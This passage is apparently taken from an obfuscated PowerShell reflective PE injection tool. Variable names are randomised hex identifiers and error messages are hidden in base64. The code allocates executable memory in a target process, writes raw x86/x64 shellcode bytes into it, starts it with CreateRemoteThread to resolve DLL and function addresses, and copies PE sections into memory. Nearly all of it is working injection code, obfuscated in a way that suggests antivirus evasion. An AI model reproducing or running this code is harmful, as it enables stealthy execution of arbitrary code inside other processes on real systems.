			${84624fe3a74b497bad75c15fb520fa25} = ${e68f649120fc4868841a2d8eea9e08f5}.VirtualAllocEx.Invoke(${dbc8e071ba554a5991d5c23be7628337}, [IntPtr]::Zero, ${ccf1c9b330644e67967ea2718117fb9b}, ${a851be47767a4e43b58c4498cda85d23}.MEM_COMMIT -bor ${a851be47767a4e43b58c4498cda85d23}.MEM_RESERVE, ${a851be47767a4e43b58c4498cda85d23}.PAGE_READWRITE)
			if (${84624fe3a74b497bad75c15fb520fa25} -eq [IntPtr]::Zero)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACAAZgBvAHIAIAB0AGgAZQAgAHIAZQB0AHUAcgBuACAAdgBhAGwAdQBlACAAbwBmACAATABvAGEAZABMAGkAYgByAGEAcgB5AEEA')))
			}
			${c456c5f4d7eb485d9182ea52890a6fed} = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			${9ed6e86e6d7a4f578dc77fb022686f7a} = @(0x48, 0xba)
			${e9dd6e218116498daf9eec6a1946697b} = @(0xff, 0xd2, 0x48, 0xba)
			${ee507b8d4af0495f8c186cf2f1ad9a5d} = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
			${a1220aac391e475094e2d6fd51dd409b} = ${c456c5f4d7eb485d9182ea52890a6fed}.Length + ${9ed6e86e6d7a4f578dc77fb022686f7a}.Length + ${e9dd6e218116498daf9eec6a1946697b}.Length + ${ee507b8d4af0495f8c186cf2f1ad9a5d}.Length + (${316b88f6ef8c400aac88c3cceb745ea2} * 3)
			${24b08de68b624efeb0e3966151e88e69} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${a1220aac391e475094e2d6fd51dd409b})
			${6770c7074f724af3b307beac3b0efcdc} = ${24b08de68b624efeb0e3966151e88e69}
			Write-BytesToMemory -bf800d3fa83245d1b619eccd7ab95bf1 ${c456c5f4d7eb485d9182ea52890a6fed} -ed8e2beac355444db175543089c05e66 ${24b08de68b624efeb0e3966151e88e69}
			${24b08de68b624efeb0e3966151e88e69} = Add-SignedIntAsUnsigned ${24b08de68b624efeb0e3966151e88e69} (${c456c5f4d7eb485d9182ea52890a6fed}.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr(${4d3bd764044f493ab1d6069f1721758a}, ${24b08de68b624efeb0e3966151e88e69}, $false)
			${24b08de68b624efeb0e3966151e88e69} = Add-SignedIntAsUnsigned ${24b08de68b624efeb0e3966151e88e69} (${316b88f6ef8c400aac88c3cceb745ea2})
			Write-BytesToMemory -bf800d3fa83245d1b619eccd7ab95bf1 ${9ed6e86e6d7a4f578dc77fb022686f7a} -ed8e2beac355444db175543089c05e66 ${24b08de68b624efeb0e3966151e88e69}
			${24b08de68b624efeb0e3966151e88e69} = Add-SignedIntAsUnsigned ${24b08de68b624efeb0e3966151e88e69} (${9ed6e86e6d7a4f578dc77fb022686f7a}.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr(${1d14c3f41cc541fbb15e2761bee7a962}, ${24b08de68b624efeb0e3966151e88e69}, $false)
			${24b08de68b624efeb0e3966151e88e69} = Add-SignedIntAsUnsigned ${24b08de68b624efeb0e3966151e88e69} (${316b88f6ef8c400aac88c3cceb745ea2})
			Write-BytesToMemory -bf800d3fa83245d1b619eccd7ab95bf1 ${e9dd6e218116498daf9eec6a1946697b} -ed8e2beac355444db175543089c05e66 ${24b08de68b624efeb0e3966151e88e69}
			${24b08de68b624efeb0e3966151e88e69} = Add-SignedIntAsUnsigned ${24b08de68b624efeb0e3966151e88e69} (${e9dd6e218116498daf9eec6a1946697b}.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr(${84624fe3a74b497bad75c15fb520fa25}, ${24b08de68b624efeb0e3966151e88e69}, $false)
			${24b08de68b624efeb0e3966151e88e69} = Add-SignedIntAsUnsigned ${24b08de68b624efeb0e3966151e88e69} (${316b88f6ef8c400aac88c3cceb745ea2})
			Write-BytesToMemory -bf800d3fa83245d1b619eccd7ab95bf1 ${ee507b8d4af0495f8c186cf2f1ad9a5d} -ed8e2beac355444db175543089c05e66 ${24b08de68b624efeb0e3966151e88e69}
			${24b08de68b624efeb0e3966151e88e69} = Add-SignedIntAsUnsigned ${24b08de68b624efeb0e3966151e88e69} (${ee507b8d4af0495f8c186cf2f1ad9a5d}.Length)
			${57fdb583807a436db51c28f76ab30f0d} = ${e68f649120fc4868841a2d8eea9e08f5}.VirtualAllocEx.Invoke(${dbc8e071ba554a5991d5c23be7628337}, [IntPtr]::Zero, [UIntPtr][UInt64]${a1220aac391e475094e2d6fd51dd409b}, ${a851be47767a4e43b58c4498cda85d23}.MEM_COMMIT -bor ${a851be47767a4e43b58c4498cda85d23}.MEM_RESERVE, ${a851be47767a4e43b58c4498cda85d23}.PAGE_EXECUTE_READWRITE)
			if (${57fdb583807a436db51c28f76ab30f0d} -eq [IntPtr]::Zero)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACAAZgBvAHIAIABzAGgAZQBsAGwAYwBvAGQAZQA=')))
			}
			${bfd6b4588cf14a19b91ca177e24a9fe3} = ${e68f649120fc4868841a2d8eea9e08f5}.WriteProcessMemory.Invoke(${dbc8e071ba554a5991d5c23be7628337}, ${57fdb583807a436db51c28f76ab30f0d}, ${6770c7074f724af3b307beac3b0efcdc}, [UIntPtr][UInt64]${a1220aac391e475094e2d6fd51dd409b}, [Ref]$NumBytesWritten)
			if ((${bfd6b4588cf14a19b91ca177e24a9fe3} -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]${a1220aac391e475094e2d6fd51dd409b}))
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABzAGgAZQBsAGwAYwBvAGQAZQAgAHQAbwAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwAgAG0AZQBtAG8AcgB5AC4A')))
			}
			${03df08d8080045db90eb42fba5fdfdab} = Create-RemoteThread -ae1e830f808141fc83d07d13d133dd73 ${dbc8e071ba554a5991d5c23be7628337} -cf3b0c7ec8154434be540fb42c7d8bc2 ${57fdb583807a436db51c28f76ab30f0d} -e68f649120fc4868841a2d8eea9e08f5 ${e68f649120fc4868841a2d8eea9e08f5}
			${ad4a1ce275f0418bb89955c7769f006a} = ${e68f649120fc4868841a2d8eea9e08f5}.WaitForSingleObject.Invoke(${03df08d8080045db90eb42fba5fdfdab}, 20000)
			if (${ad4a1ce275f0418bb89955c7769f006a} -ne 0)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEMAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkACAAdABvACAAYwBhAGwAbAAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAgAGYAYQBpAGwAZQBkAC4A')))
			}
			[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${316b88f6ef8c400aac88c3cceb745ea2})
			${ad4a1ce275f0418bb89955c7769f006a} = ${e68f649120fc4868841a2d8eea9e08f5}.ReadProcessMemory.Invoke(${dbc8e071ba554a5991d5c23be7628337}, ${84624fe3a74b497bad75c15fb520fa25}, $ReturnValMem, [UIntPtr][UInt64]${316b88f6ef8c400aac88c3cceb745ea2}, [Ref]$NumBytesWritten)
			if (${ad4a1ce275f0418bb89955c7769f006a} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFIAZQBhAGQAUAByAG8AYwBlAHMAcwBNAGUAbQBvAHIAeQAgAGYAYQBpAGwAZQBkAA==')))
			}
			[IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])
			${e68f649120fc4868841a2d8eea9e08f5}.VirtualFreeEx.Invoke(${dbc8e071ba554a5991d5c23be7628337}, ${84624fe3a74b497bad75c15fb520fa25}, [UIntPtr][UInt64]0, ${a851be47767a4e43b58c4498cda85d23}.MEM_RELEASE) | Out-Null
			${e68f649120fc4868841a2d8eea9e08f5}.VirtualFreeEx.Invoke(${dbc8e071ba554a5991d5c23be7628337}, ${57fdb583807a436db51c28f76ab30f0d}, [UIntPtr][UInt64]0, ${a851be47767a4e43b58c4498cda85d23}.MEM_RELEASE) | Out-Null
		}
		else
		{
			[IntPtr]${03df08d8080045db90eb42fba5fdfdab} = Create-RemoteThread -ae1e830f808141fc83d07d13d133dd73 ${dbc8e071ba554a5991d5c23be7628337} -cf3b0c7ec8154434be540fb42c7d8bc2 ${1d14c3f41cc541fbb15e2761bee7a962} -c4ed07bb07b94101b05bf762b53447d9 ${4d3bd764044f493ab1d6069f1721758a} -e68f649120fc4868841a2d8eea9e08f5 ${e68f649120fc4868841a2d8eea9e08f5}
			${ad4a1ce275f0418bb89955c7769f006a} = ${e68f649120fc4868841a2d8eea9e08f5}.WaitForSingleObject.Invoke(${03df08d8080045db90eb42fba5fdfdab}, 20000)
			if (${ad4a1ce275f0418bb89955c7769f006a} -ne 0)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEMAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkACAAdABvACAAYwBhAGwAbAAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAgAGYAYQBpAGwAZQBkAC4A')))
			}
			[Int32]$ExitCode = 0
			${ad4a1ce275f0418bb89955c7769f006a} = ${e68f649120fc4868841a2d8eea9e08f5}.GetExitCodeThread.Invoke(${03df08d8080045db90eb42fba5fdfdab}, [Ref]$ExitCode)
			if ((${ad4a1ce275f0418bb89955c7769f006a} -eq 0) -or ($ExitCode -eq 0))
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEcAZQB0AEUAeABpAHQAQwBvAGQAZQBUAGgAcgBlAGEAZAAgAGYAYQBpAGwAZQBkAA==')))
			}
			[IntPtr]$DllAddress = [IntPtr]$ExitCode
		}
		${e68f649120fc4868841a2d8eea9e08f5}.VirtualFreeEx.Invoke(${dbc8e071ba554a5991d5c23be7628337}, ${4d3bd764044f493ab1d6069f1721758a}, [UIntPtr][UInt64]0, ${a851be47767a4e43b58c4498cda85d23}.MEM_RELEASE) | Out-Null
		return $DllAddress
	}
	Function Get-RemoteProcAddress
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		${dbc8e071ba554a5991d5c23be7628337},
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		${b4c822cc06214edb95f95e74dd00cbf7},
		[Parameter(Position=2, Mandatory=$true)]
		[IntPtr]
		${a4dcea6ae1694304a1b182f1261fe706},
        [Parameter(Position=3, Mandatory=$true)]
        [Bool]
        ${b509d239898c49579585d7368c4a3e61}
		)
		${316b88f6ef8c400aac88c3cceb745ea2} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[IntPtr]${a5bd7d9ff9ac4647b21cfe268690ff32} = [IntPtr]::Zero   
        if (-not ${b509d239898c49579585d7368c4a3e61})
        {
        	${bcef229339c34b6aa25db34ee4c417ae} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${a4dcea6ae1694304a1b182f1261fe706})
		    ${4d2421d849684f4c86428e029929d167} = [UIntPtr][UInt64]([UInt64]${bcef229339c34b6aa25db34ee4c417ae}.Length + 1)
		    ${a5bd7d9ff9ac4647b21cfe268690ff32} = ${e68f649120fc4868841a2d8eea9e08f5}.VirtualAllocEx.Invoke(${dbc8e071ba554a5991d5c23be7628337}, [IntPtr]::Zero, ${4d2421d849684f4c86428e029929d167}, ${a851be47767a4e43b58c4498cda85d23}.MEM_COMMIT -bor ${a851be47767a4e43b58c4498cda85d23}.MEM_RESERVE, ${a851be47767a4e43b58c4498cda85d23}.PAGE_READWRITE)
		    if (${a5bd7d9ff9ac4647b21cfe268690ff32} -eq [IntPtr]::Zero)
		    {
			    Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAA==')))
		    }
		    [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		    ${bfd6b4588cf14a19b91ca177e24a9fe3} = ${e68f649120fc4868841a2d8eea9e08f5}.WriteProcessMemory.Invoke(${dbc8e071ba554a5991d5c23be7628337}, ${a5bd7d9ff9ac4647b21cfe268690ff32}, ${a4dcea6ae1694304a1b182f1261fe706}, ${4d2421d849684f4c86428e029929d167}, [Ref]$NumBytesWritten)
		    if (${bfd6b4588cf14a19b91ca177e24a9fe3} -eq $false)
		    {
			    Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABEAEwATAAgAHAAYQB0AGgAIAB0AG8AIAByAGUAbQBvAHQAZQAgAHAAcgBvAGMAZQBzAHMAIABtAGUAbQBvAHIAeQA=')))
		    }
		    if (${4d2421d849684f4c86428e029929d167} -ne $NumBytesWritten)
		    {
			    Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGQAbgAnAHQAIAB3AHIAaQB0AGUAIAB0AGgAZQAgAGUAeABwAGUAYwB0AGUAZAAgAGEAbQBvAHUAbgB0ACAAbwBmACAAYgB5AHQAZQBzACAAdwBoAGUAbgAgAHcAcgBpAHQAaQBuAGcAIABhACAARABMAEwAIABwAGEAdABoACAAdABvACAAbABvAGEAZAAgAHQAbwAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAA==')))
		    }
        }
        else
        {
            ${a5bd7d9ff9ac4647b21cfe268690ff32} = ${a4dcea6ae1694304a1b182f1261fe706}
        }
		${81f04b18eb70444ab2797c3a533e47a1} = ${e68f649120fc4868841a2d8eea9e08f5}.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awBlAHIAbgBlAGwAMwAyAC4AZABsAGwA'))))
		${864b0de0dd41414d9fb441dde3d2c82c} = ${e68f649120fc4868841a2d8eea9e08f5}.GetProcAddress.Invoke(${81f04b18eb70444ab2797c3a533e47a1}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzAA==')))) 
		${18c0c7f9728644daba45b24918ca8d5b} = ${e68f649120fc4868841a2d8eea9e08f5}.VirtualAllocEx.Invoke(${dbc8e071ba554a5991d5c23be7628337}, [IntPtr]::Zero, [UInt64][UInt64]${316b88f6ef8c400aac88c3cceb745ea2}, ${a851be47767a4e43b58c4498cda85d23}.MEM_COMMIT -bor ${a851be47767a4e43b58c4498cda85d23}.MEM_RESERVE, ${a851be47767a4e43b58c4498cda85d23}.PAGE_READWRITE)
		if (${18c0c7f9728644daba45b24918ca8d5b} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACAAZgBvAHIAIAB0AGgAZQAgAHIAZQB0AHUAcgBuACAAdgBhAGwAdQBlACAAbwBmACAARwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzAA==')))
		}
		[Byte[]]$GetProcAddressSC = @()
		if (${a6f1c45867c645738edd3413cf0d7718}.PE64Bit -eq $true)
		{
			${49457ea1799d4da484b51cf3a1bf2a20} = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			${6736adc4a2354938887a14cbdef20b03} = @(0x48, 0xba)
			${26b5778b1ac94fb2aa3787ad1e9c5013} = @(0x48, 0xb8)
			${4fbd055390c343a5a4c74617b154d3ec} = @(0xff, 0xd0, 0x48, 0xb9)
			${8e6658f450754288ae26bfb33ae856f2} = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			${49457ea1799d4da484b51cf3a1bf2a20} = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			${6736adc4a2354938887a14cbdef20b03} = @(0xb9)
			${26b5778b1ac94fb2aa3787ad1e9c5013} = @(0x51, 0x50, 0xb8)
			${4fbd055390c343a5a4c74617b154d3ec} = @(0xff, 0xd0, 0xb9)
			${8e6658f450754288ae26bfb33ae856f2} = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
		${a1220aac391e475094e2d6fd51dd409b} = ${49457ea1799d4da484b51cf3a1bf2a20}.Length + ${6736adc4a2354938887a14cbdef20b03}.Length + ${26b5778b1ac94fb2aa3787ad1e9c5013}.Length + ${4fbd055390c343a5a4c74617b154d3ec}.Length + ${8e6658f450754288ae26bfb33ae856f2}.Length + (${316b88f6ef8c400aac88c3cceb745ea2} * 4)
		${24b08de68b624efeb0e3966151e88e69} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${a1220aac391e475094e2d6fd51dd409b})
		${6770c7074f724af3b307beac3b0efcdc} = ${24b08de68b624efeb0e3966151e88e69}
		Write-BytesToMemory -bf800d3fa83245d1b619eccd7ab95bf1 ${49457ea1799d4da484b51cf3a1bf2a20} -ed8e2beac355444db175543089c05e66 ${24b08de68b624efeb0e3966151e88e69}
		${24b08de68b624efeb0e3966151e88e69} = Add-SignedIntAsUnsigned ${24b08de68b624efeb0e3966151e88e69} (${49457ea1799d4da484b51cf3a1bf2a20}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${b4c822cc06214edb95f95e74dd00cbf7}, ${24b08de68b624efeb0e3966151e88e69}, $false)
		${24b08de68b624efeb0e3966151e88e69} = Add-SignedIntAsUnsigned ${24b08de68b624efeb0e3966151e88e69} (${316b88f6ef8c400aac88c3cceb745ea2})
		Write-BytesToMemory -bf800d3fa83245d1b619eccd7ab95bf1 ${6736adc4a2354938887a14cbdef20b03} -ed8e2beac355444db175543089c05e66 ${24b08de68b624efeb0e3966151e88e69}
		${24b08de68b624efeb0e3966151e88e69} = Add-SignedIntAsUnsigned ${24b08de68b624efeb0e3966151e88e69} (${6736adc4a2354938887a14cbdef20b03}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${a5bd7d9ff9ac4647b21cfe268690ff32}, ${24b08de68b624efeb0e3966151e88e69}, $false)
		${24b08de68b624efeb0e3966151e88e69} = Add-SignedIntAsUnsigned ${24b08de68b624efeb0e3966151e88e69} (${316b88f6ef8c400aac88c3cceb745ea2})
		Write-BytesToMemory -bf800d3fa83245d1b619eccd7ab95bf1 ${26b5778b1ac94fb2aa3787ad1e9c5013} -ed8e2beac355444db175543089c05e66 ${24b08de68b624efeb0e3966151e88e69}
		${24b08de68b624efeb0e3966151e88e69} = Add-SignedIntAsUnsigned ${24b08de68b624efeb0e3966151e88e69} (${26b5778b1ac94fb2aa3787ad1e9c5013}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${864b0de0dd41414d9fb441dde3d2c82c}, ${24b08de68b624efeb0e3966151e88e69}, $false)
		${24b08de68b624efeb0e3966151e88e69} = Add-SignedIntAsUnsigned ${24b08de68b624efeb0e3966151e88e69} (${316b88f6ef8c400aac88c3cceb745ea2})
		Write-BytesToMemory -bf800d3fa83245d1b619eccd7ab95bf1 ${4fbd055390c343a5a4c74617b154d3ec} -ed8e2beac355444db175543089c05e66 ${24b08de68b624efeb0e3966151e88e69}
		${24b08de68b624efeb0e3966151e88e69} = Add-SignedIntAsUnsigned ${24b08de68b624efeb0e3966151e88e69} (${4fbd055390c343a5a4c74617b154d3ec}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${18c0c7f9728644daba45b24918ca8d5b}, ${24b08de68b624efeb0e3966151e88e69}, $false)
		${24b08de68b624efeb0e3966151e88e69} = Add-SignedIntAsUnsigned ${24b08de68b624efeb0e3966151e88e69} (${316b88f6ef8c400aac88c3cceb745ea2})
		Write-BytesToMemory -bf800d3fa83245d1b619eccd7ab95bf1 ${8e6658f450754288ae26bfb33ae856f2} -ed8e2beac355444db175543089c05e66 ${24b08de68b624efeb0e3966151e88e69}
		${24b08de68b624efeb0e3966151e88e69} = Add-SignedIntAsUnsigned ${24b08de68b624efeb0e3966151e88e69} (${8e6658f450754288ae26bfb33ae856f2}.Length)
		${57fdb583807a436db51c28f76ab30f0d} = ${e68f649120fc4868841a2d8eea9e08f5}.VirtualAllocEx.Invoke(${dbc8e071ba554a5991d5c23be7628337}, [IntPtr]::Zero, [UIntPtr][UInt64]${a1220aac391e475094e2d6fd51dd409b}, ${a851be47767a4e43b58c4498cda85d23}.MEM_COMMIT -bor ${a851be47767a4e43b58c4498cda85d23}.MEM_RESERVE, ${a851be47767a4e43b58c4498cda85d23}.PAGE_EXECUTE_READWRITE)
		if (${57fdb583807a436db51c28f76ab30f0d} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACAAZgBvAHIAIABzAGgAZQBsAGwAYwBvAGQAZQA=')))
		}
		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		${bfd6b4588cf14a19b91ca177e24a9fe3} = ${e68f649120fc4868841a2d8eea9e08f5}.WriteProcessMemory.Invoke(${dbc8e071ba554a5991d5c23be7628337}, ${57fdb583807a436db51c28f76ab30f0d}, ${6770c7074f724af3b307beac3b0efcdc}, [UIntPtr][UInt64]${a1220aac391e475094e2d6fd51dd409b}, [Ref]$NumBytesWritten)
		if ((${bfd6b4588cf14a19b91ca177e24a9fe3} -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]${a1220aac391e475094e2d6fd51dd409b}))
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABzAGgAZQBsAGwAYwBvAGQAZQAgAHQAbwAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwAgAG0AZQBtAG8AcgB5AC4A')))
		}
		${03df08d8080045db90eb42fba5fdfdab} = Create-RemoteThread -ae1e830f808141fc83d07d13d133dd73 ${dbc8e071ba554a5991d5c23be7628337} -cf3b0c7ec8154434be540fb42c7d8bc2 ${57fdb583807a436db51c28f76ab30f0d} -e68f649120fc4868841a2d8eea9e08f5 ${e68f649120fc4868841a2d8eea9e08f5}
		${ad4a1ce275f0418bb89955c7769f006a} = ${e68f649120fc4868841a2d8eea9e08f5}.WaitForSingleObject.Invoke(${03df08d8080045db90eb42fba5fdfdab}, 20000)
		if (${ad4a1ce275f0418bb89955c7769f006a} -ne 0)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEMAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkACAAdABvACAAYwBhAGwAbAAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAgAGYAYQBpAGwAZQBkAC4A')))
		}
		[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${316b88f6ef8c400aac88c3cceb745ea2})
		${ad4a1ce275f0418bb89955c7769f006a} = ${e68f649120fc4868841a2d8eea9e08f5}.ReadProcessMemory.Invoke(${dbc8e071ba554a5991d5c23be7628337}, ${18c0c7f9728644daba45b24918ca8d5b}, $ReturnValMem, [UIntPtr][UInt64]${316b88f6ef8c400aac88c3cceb745ea2}, [Ref]$NumBytesWritten)
		if ((${ad4a1ce275f0418bb89955c7769f006a} -eq $false) -or ($NumBytesWritten -eq 0))
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFIAZQBhAGQAUAByAG8AYwBlAHMAcwBNAGUAbQBvAHIAeQAgAGYAYQBpAGwAZQBkAA==')))
		}
		[IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])
		${e68f649120fc4868841a2d8eea9e08f5}.VirtualFreeEx.Invoke(${dbc8e071ba554a5991d5c23be7628337}, ${57fdb583807a436db51c28f76ab30f0d}, [UIntPtr][UInt64]0, ${a851be47767a4e43b58c4498cda85d23}.MEM_RELEASE) | Out-Null
		${e68f649120fc4868841a2d8eea9e08f5}.VirtualFreeEx.Invoke(${dbc8e071ba554a5991d5c23be7628337}, ${18c0c7f9728644daba45b24918ca8d5b}, [UIntPtr][UInt64]0, ${a851be47767a4e43b58c4498cda85d23}.MEM_RELEASE) | Out-Null
        if (-not ${b509d239898c49579585d7368c4a3e61})
        {
            ${e68f649120fc4868841a2d8eea9e08f5}.VirtualFreeEx.Invoke(${dbc8e071ba554a5991d5c23be7628337}, ${a5bd7d9ff9ac4647b21cfe268690ff32}, [UIntPtr][UInt64]0, ${a851be47767a4e43b58c4498cda85d23}.MEM_RELEASE) | Out-Null
        }
		return $ProcAddress
	}
	Function Copy-Sections
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		${dd84f627e34042a19d0e69bbfb56125d},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		${a6f1c45867c645738edd3413cf0d7718},
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		${e68f649120fc4868841a2d8eea9e08f5},
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		${e39002e42e324234be4b9268daddc239}
		)
		for( ${9282212b31e84e3ca7221e3fcd69f077} = 0; ${9282212b31e84e3ca7221e3fcd69f077} -lt ${a6f1c45867c645738edd3413cf0d7718}.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; ${9282212b31e84e3ca7221e3fcd69f077}++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]${a6f1c45867c645738edd3413cf0d7718}.SectionHeaderPtr) (${9282212b31e84e3ca7221e3fcd69f077} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]${e39002e42e324234be4b9268daddc239}.IMAGE_SECTION_HEADER)))
			${6f0023c5723b446398a76b7e0d1380cb} = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]${e39002e42e324234be4b9268daddc239}.IMAGE_SECTION_HEADER)
			[IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]${a6f1c45867c645738edd3413cf0d7718}.PEHandle) ([Int64]${6f0023c5723b446398a76b7e0d1380cb}.VirtualAddress))
			${f3165d1343414346a468a2e1874eba5e} = ${6f0023c5723b446398a76b7e0d1380cb}.SizeOfRawData
			if (${6f0023c5723b446398a76b7e0d1380cb}.PointerToRawData -eq 0)
			{
				${f3165d1343414346a468a2e1874eba5e} = 0
			}
			if (${f3165d1343414346a468a2e1874eba5e} -gt ${6f0023c5723b446398a76b7e0d1380cb}.VirtualSize)
			{
				${f3165d1343414346a468a2e1874eba5e} = ${6f0023c5723b446398a76b7e0d1380cb}.VirtualSize
			}
			if (${f3165d1343414346a468a2e1874eba5e} -gt 0)
			{
				Test-MemoryRangeValid -ad0937a6b5514403a124ef387e801a35 $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHAAeQAtAFMAZQBjAHQAaQBvAG4AcwA6ADoATQBhAHIAcwBoAGEAbABDAG8AcAB5AA=='))) -a6f1c45867c645738edd3413cf0d7718 ${a6f1c45867c645738edd3413cf0d7718} -cf3b0c7ec8154434be540fb42c7d8bc2 $SectionDestAddr -ec6af79a1f4140bf9022e4a98471da5e ${f3165d1343414346a468a2e1874eba5e} | Out-Null
				[System.Runtime.InteropServices.Marshal]::Copy(${dd84f627e34042a19d0e69bbfb56125d}, [Int32]${6f0023c5723b446398a76b7e0d1380cb}.PointerToRawData, $SectionDestAddr, ${f3165d1343414346a468a2e1874eba5e})
			}
			if (${6f0023c5723b446398a76b7e0d1380cb}.SizeOfRawData -lt ${6f0023c5723b446398a76b7e0d1380cb}.VirtualSize)
			{
				${be1ba584fe1b4e44bcea9d7c3f672814} = ${6f0023c5723b446398a76b7e0d1380cb}.VirtualSize - ${f3165d1343414346a468a2e1874eba5e}
				[IntPtr]${cf3b0c7ec8154434be540fb42c7d8bc2} = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]${f3165d1343414346a468a2e1874eba5e}))
